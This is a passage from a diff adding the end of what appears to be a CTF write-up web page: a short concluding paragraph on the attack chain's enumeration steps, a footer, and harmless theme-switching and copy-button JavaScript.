+<p>Every stage of this machine provided information that made the next stage possible. Missing the <code>/mail</code> directory, ignoring the PCAP, skipping cron enumeration, or failing to inspect <code>sudo -l</code> could have stopped the attack path completely.</p>
+<p>In CTFs, the flags are the objective.</p>
+<p>In real environments, the same chain would represent a complete compromise of the system.</p>
+
+    </article>
+  </main>
+
+  <footer>
+    <span class="f-accent">$</span> echo "Made by <span class="f-accent">Aryan Giri</span>" &nbsp;·&nbsp; <a href="https://github.com/giriaryan694-a11y" target="_blank" rel="noopener noreferrer">GitHub</a>
+  </footer>
+
+  <script>
+    /* Theme — synced with main site via same cookie */
+    const themes=["dark","light","eye-saver"];
+    const themeData={"dark":{emoji:"🌙",label:"Dark"},"light":{emoji:"☀️",label:"Light"},"eye-saver":{emoji:"☕",label:"Reading"}};
+    function setCookie(n,v,d){const e=new Date();e.setTime(e.getTime()+d*86400000);document.cookie=`${n}=${v};expires=${e.toUTCString()};path=/`;}
+    function getCookie(n){const m=document.cookie.match(new RegExp('(^| )'+n+'=([^;]+)'));return m?m[2]:null;}
+    let currentTheme=getCookie("site_theme")||"dark";
+    const themeBtn=document.getElementById("theme-btn");
+    const themeEmoji=document.getElementById("theme-emoji");
+    function applyTheme(theme,animate=false){
+      document.body.className=theme==="dark"?"":theme;
+      themeEmoji.textContent=themeData[theme].emoji;
+      document.getElementById("theme-label").textContent=themeData[theme].label;
+      setCookie("site_theme",theme,365);
+      if(animate){themeEmoji.style.animation="none";themeEmoji.offsetHeight;themeEmoji.style.animation="popSpin 0.4s cubic-bezier(0.175,0.885,0.32,1.275) forwards";}
+    }
+    applyTheme(currentTheme);
+    themeBtn.addEventListener("click",()=>{currentTheme=themes[(themes.indexOf(currentTheme)+1)%themes.length];applyTheme(currentTheme,true);});
+
+    /* Links → new tab + copy buttons on code blocks */
+    document.querySelectorAll(".post-content a").forEach(l => {
+      l.setAttribute("target", "_blank");
+      l.setAttribute("rel", "noopener noreferrer");
+    });
+    document.querySelectorAll("pre").forEach(pre => {
+      const code = pre.querySelector("code");
+      if (!code) return;
+      const btn = document.createElement("button");
+      btn.className = "copy-btn";
+      btn.textContent = "copy";
+      btn.onclick = async () => {
+        try { await navigator.clipboard.writeText(code.innerText.trimEnd()); }
+        catch {}
+        btn.textContent = "✓ copied"; btn.classList.add("copied");
+        setTimeout(() => { btn.textContent = "copy"; btn.classList.remove("copied"); }, 2000);
+      };
+      pre.appendChild(btn);
+    });
+  </script>
+</body>
+</html>
